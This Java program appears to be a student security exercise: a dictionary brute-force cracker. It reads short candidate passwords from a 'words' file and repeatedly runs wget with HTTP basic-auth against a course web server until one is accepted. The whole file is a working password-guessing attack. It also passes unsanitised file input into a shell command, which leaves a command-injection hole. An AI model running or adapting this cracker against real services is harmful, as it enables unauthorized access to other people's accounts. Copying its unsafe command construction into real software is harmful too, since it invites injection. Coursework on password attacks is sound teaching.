


import java.io.*;


class Dictionary{

public static void main(String args[]){
	try{
		
        File file = new File("words");
		FileReader fr = new FileReader(file);
		BufferedReader bf = new BufferedReader(fr);
		URLHack uh = new URLHack();
		String line="";
		while((line = bf.readLine()) != null){
			if(line.length() <=3) {
				
                
                uh.crackIt(line);
		    }
        }
	}
	catch(IOException ioe){
		System.out.println("Error: "+ioe);
	}

}
}



class URLHack{

public void crackIt(String paas){
		Process p=null;
		try{
			p = Runtime.getRuntime().exec("wget -nv --http-user= --http-passwd="+paas+
			" http://sec-crack.cs.rmit.edu./SEC/2/");



			InputStream is = p.getErrorStream();
			BufferedReader bf = new BufferedReader(new InputStreamReader(is));

			String tempLine="";
			tempLine = bf.readLine();
			System.out.println(tempLine);

			if(tempLine.length() == 21) 
				System.out.println("Invalid Password " +paas);
			else
			{
				System.out.println("Password is " + paas);
				System.exit(0);
			}


		}

		catch(Exception e){
			System.out.println(" ERROR "+e);


		}
}
}